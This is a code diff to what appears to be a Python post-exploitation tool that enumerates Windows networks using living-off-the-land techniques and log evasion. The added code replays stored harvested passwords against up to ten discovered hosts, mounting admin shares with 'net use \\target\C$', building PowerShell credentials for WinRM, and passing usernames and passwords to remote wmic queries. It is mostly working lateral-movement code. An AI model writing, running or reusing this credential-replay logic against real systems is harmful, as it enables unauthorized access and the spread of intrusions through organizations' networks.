@@ -15,6 +15,7 @@ from rich import box
 from modules.utils import execute_cmd, execute_powershell, validate_target
 from modules.loghunter_integration import LogHunter, WindowsMoonwalk
 from modules.diagram_generator import DiagramGenerator
+from modules.credential_manager import get_credential_manager, CredentialType
 
 # Export for testing compatibility
 __all__ = ['AutoEnumerator', 'AutoEnumerateModule', 'ReportGenerator', 'DiagramGenerator']
@@ -47,6 +48,7 @@ class AutoEnumerator:
         self.loghunter = None
         self.moonwalk = WindowsMoonwalk(console, session_data)
         self.use_moonwalk = True  # Enable moonwalk at all stages
+        self.cred_manager = get_credential_manager()  # For credential replay
         # Initialize PE5 utils if available
         try:
             from modules.pe5_utils import PE5Utils
@@ -332,24 +334,55 @@ class AutoEnumerator:
                 arp_targets = self.enumeration_data['network'].get('arp_targets', [])
                 targets.extend(arp_targets[:10])
             
-            # Test connectivity to targets
-            progress.update(task, advance=30, description="[cyan]Testing target connectivity...")
+            # Test connectivity to targets with credential replay
+            progress.update(task, advance=30, description="[cyan]Testing target connectivity with credential replay...")
             tested_targets = []
             for target in targets[:10]:  # Limit to 10 targets
                 if not isinstance(target, str):
                     continue
                 try:
-                    # Test SMB
-                    exit_code, stdout, stderr = execute_cmd(f"net view \\\\{target}", lab_use=self.lab_use)
-                    if exit_code == 0:
-                        self.enumeration_data['lateral_targets'].append({
-                            'target': target,
-                            'smb_accessible': True,
-                            'shares': stdout[:200]
-                        })
+                    # Try credential replay first
+                    stored_creds = self.cred_manager.get_credentials_by_target(target)
+                    if not stored_creds:
+                        # Try domain credentials
+                        stored_creds = self.cred_manager.get_all()
                     
-                    # Test WinRM
-                    ps_cmd = f"Test-WSMan -ComputerName {target} -ErrorAction SilentlyContinue"
+                    cred_used = None
+                    if stored_creds:
+                        # Try password credentials first
+                        password_creds = [c for c in stored_creds if c.cred_type == CredentialType.PASSWORD.value and c.password and c.valid]
+                        if password_creds:
+                            cred_used = password_creds[0]
+                    
+                    # Test SMB with credentials if available
+                    if cred_used:
+                        smb_cmd = f'net use \\\\{target}\\C$ /user:{cred_used.domain or ""}\\{cred_used.username} {cred_used.password}'
+                        exit_code, stdout, stderr = execute_cmd(smb_cmd, lab_use=self.lab_use)
+                        if exit_code == 0:
+                            self.enumeration_data['lateral_targets'].append({
+                                'target': target,
+                                'smb_accessible': True,
+                                'shares': stdout[:200],
+                                'credential_used': f"{cred_used.username}@{cred_used.domain or 'local'}"
+                            })
+                            # Mark credential as used
+                            self.cred_manager.mark_as_used(cred_used.id)
+                    else:
+                        # Test SMB without credentials
+                        exit_code, stdout, stderr = execute_cmd(f"net view \\\\{target}", lab_use=self.lab_use)
+                        if exit_code == 0:
+                            self.enumeration_data['lateral_targets'].append({
+                                'target': target,
+                                'smb_accessible': True,
+                                'shares': stdout[:200]
+                            })
+                    
+                    # Test WinRM with credentials if available
+                    if cred_used:
+                        ps_cmd = f"$cred = New-Object System.Management.Automation.PSCredential('{cred_used.domain or ''}\\{cred_used.username}', (ConvertTo-SecureString '{cred_used.password}' -AsPlainText -Force)); Test-WSMan -ComputerName {target} -Credential $cred -ErrorAction SilentlyContinue"
+                    else:
+                        ps_cmd = f"Test-WSMan -ComputerName {target} -ErrorAction SilentlyContinue"
+                    
                     exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
                     if exit_code == 0:
                         # Update existing target or create new
@@ -357,13 +390,18 @@ class AutoEnumerator:
                         for t in self.enumeration_data['lateral_targets']:
                             if isinstance(t, dict) and t.get('target') == target:
                                 t['winrm_accessible'] = True
+                                if cred_used and 'credential_used' not in t:
+                                    t['credential_used'] = f"{cred_used.username}@{cred_used.domain or 'local'}"
                                 found = True
                                 break
                         if not found:
-                            self.enumeration_data['lateral_targets'].append({
+                            target_entry = {
                                 'target': target,
                                 'winrm_accessible': True
-                            })
+                            }
+                            if cred_used:
+                                target_entry['credential_used'] = f"{cred_used.username}@{cred_used.domain or 'local'}"
+                            self.enumeration_data['lateral_targets'].append(target_entry)
                 
                 except Exception:
                     continue
@@ -480,7 +518,7 @@ class AutoEnumerator:
         progress.update(task, advance=100, description="[green]Lateral movement complete")
     
     def _enumerate_remote_target(self, target: str, target_info: Dict[str, Any], depth: int) -> Dict[str, Any]:
-        """Enumerate a remote target using LOTL techniques"""
+        """Enumerate a remote target using LOTL techniques with credential replay"""
         remote_data = {
             'target': target,
             'depth': depth,
@@ -494,14 +532,28 @@ class AutoEnumerator:
         }
         
         try:
+            # Get credentials for this target (credential replay)
+            stored_creds = self.cred_manager.get_credentials_by_target(target)
+            if not stored_creds:
+                stored_creds = self.cred_manager.get_all()
+            
+            cred_used = None
+            if stored_creds:
+                password_creds = [c for c in stored_creds if c.cred_type == CredentialType.PASSWORD.value and c.password and c.valid]
+                if password_creds:
+                    cred_used = password_creds[0]
+                    remote_data['credential_used'] = f"{cred_used.username}@{cred_used.domain or 'local'}"
+            
             # Choose method based on availability
-            use_wmic = target_info.get('winrm', False)
-            use_smb = target_info.get('smb', False)
+            use_wmic = target_info.get('winrm', False) or target_info.get('winrm_accessible', False)
+            use_smb = target_info.get('smb', False) or target_info.get('smb_accessible', False)
             
             if use_wmic:
-                # Use WMI for remote enumeration (LOTL)
-                # System info
-                wmic_cmd = f'wmic /node:{target} os get name,version'
+                # Use WMI for remote enumeration (LOTL) with credentials if available
+                if cred_used:
+                    wmic_cmd = f'wmic /node:{target} /user:{cred_used.domain or ""}\\{cred_used.username} /password:{cred_used.password} os get name,version'
+                else:
+                    wmic_cmd = f'wmic /node:{target} os get name,version'
                 exit_code, stdout, stderr = execute_cmd(wmic_cmd, lab_use=self.lab_use)
                 if exit_code == 0:
                     remote_data['system_info']['os'] = stdout[:200]
